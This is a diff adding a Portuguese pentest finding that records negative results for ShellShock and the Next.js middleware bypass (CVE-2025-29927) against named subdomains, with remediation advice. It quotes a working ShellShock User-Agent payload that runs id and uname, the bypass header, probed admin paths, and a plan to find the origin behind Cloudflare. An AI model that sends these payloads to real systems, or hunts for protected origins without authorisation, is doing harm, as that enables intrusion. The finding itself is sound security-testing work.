@@ -1,0 +1,47 @@
+# F-013 ShellShock (CVE-2014-6271) e Next.js middleware bypass (CVE-2025-29927) — NEGATIVOS
+Alvo: envio.fernandapessoa.com.br (ShellShock) / app.fernandapessoa.com.br (CVE-2025-29927)
+Severidade: Info (vetores não exploráveis neste momento)
+Timestamp: 2026-08-27T16:18:36Z
+
+## ShellShock CVE-2014-6271 — envio.fernandapessoa.com.br/cgi-bin/
+
+### Reprodução
+    UA: () { :;}; echo "Content-Type: text/plain"; echo; echo "SHELLSHOCK_TEST_6271"; id; uname -a
+    GET http://envio.fernandapessoa.com.br/cgi-bin/printenv         -> 500 (Apache)
+    GET /cgi-bin/test-cgi, /cgi-bin/env.cgi, /cgi-bin/hello, etc.   -> 500 todos
+    GET /cgi-sys/defaultwebpage.cgi                                -> 200 (página default, não bash)
+    GET /cgi-bin/ (index)                                          -> 403
+
+Respostas 500 idênticas com UA normal e UA malicioso — nenhuma contém o marcador
+"SHELLSHOCK_TEST_6271" nem output de `id`/`uname`. O upstream (Apache atrás de
+nginx) retorna 500 genérico (script não existe / ErrorDocument 500 também falha).
+
+### Interpretação
+- /cgi-bin/* é roteado ao Apache, mas nenhum CGI script existe (todos 500/403).
+- Sem CGI em bash acessível, ShellShock não é aplicável.
+- Diretório /cgi-bin/ sem scripts — apenas placeholder.
+
+### Recomendação
+Remover /cgi-bin/ e o directory listing de envio.fernandapessoa.com.br.
+
+## CVE-2025-29927 — Next.js middleware bypass em app.fernandapessoa.com.br
+
+### Reprodução
+    Header: x-middleware-subrequest: middleware:middleware:middleware:middleware
+    GET /admin, /dashboard, /api/auth, /_next/data, /portal, /aluno, /administrador
+    -> TODOS 403 (Cloudflare edge) com e sem o header de bypass (mesmo tamanho de body).
+
+### Interpretação
+- app.fernandapessoa.com.br está totalmente atrás de Cloudflare (WAF managed
+  challenge) que bloqueia no edge, impedindo alcançar o origin Next.js.
+- O IP 187.45.185.33 (cPanel host) NÃO serve o app Next.js — origem real não
+  determinada (provavelmente host PaaS/Vercel-like, não o servidor cPanel).
+- Não foi possível testar o bypass no origin; CVE inconclusivo (bloqueado por CF).
+
+### Recomendação
+Aplicar patch do Next.js (>= 14.2.25 / 15.2.4) independentemente, e garantir que o
+origin não seja alcançável por IP direto (bypass de CF) sem proteção.
+
+## Próximo passo
+- Re-testar CVE-2025-29927 caso a origem real do Next.js seja descoberta (outro IP
+  não-Cloudflare). Encaminhar ao cve/exploit specialist se a origem for encontrada.
